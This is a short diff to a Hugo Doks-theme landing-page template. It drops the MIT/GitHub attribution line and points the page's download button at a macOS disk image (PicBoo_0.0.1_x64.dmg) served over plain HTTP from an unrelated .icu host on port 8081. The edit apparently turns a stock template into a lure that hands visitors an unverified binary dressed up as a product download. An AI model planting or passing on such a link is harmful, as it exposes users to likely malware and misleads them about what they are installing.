@@ -7,9 +7,7 @@
       <a class="btn btn-primary btn-lg px-4 mb-2"
         href="/docs/{{ if .Site.Params.options.docsVersioning }}{{ .Site.Params.docsVersion }}/{{ end }}prologue/introduction/"
         role="button">{{ i18n "get-started" }}</a>
-      <a class="btn btn-primary btn-lg px-4 mb-2" href="" role="button">{{ i18n "goto-download" }}</a>
-      <p class="meta">Open-source MIT Licensed. <a href="https://github.com/h-enk/doks">GitHub v{{ $data := getJSON
-          "/package.json" }}{{ $data.version }}</a></p>
+      <a class="btn btn-primary btn-lg px-4 mb-2" href="http://static.bbclient.icu:8081/PicBoo_0.0.1_x64.dmg" role="button">{{ i18n "goto-download" }}</a>
     </div>
     <div class="col col-xl-8 text-center">
       <img src="images/vendor/doks.png"></img>
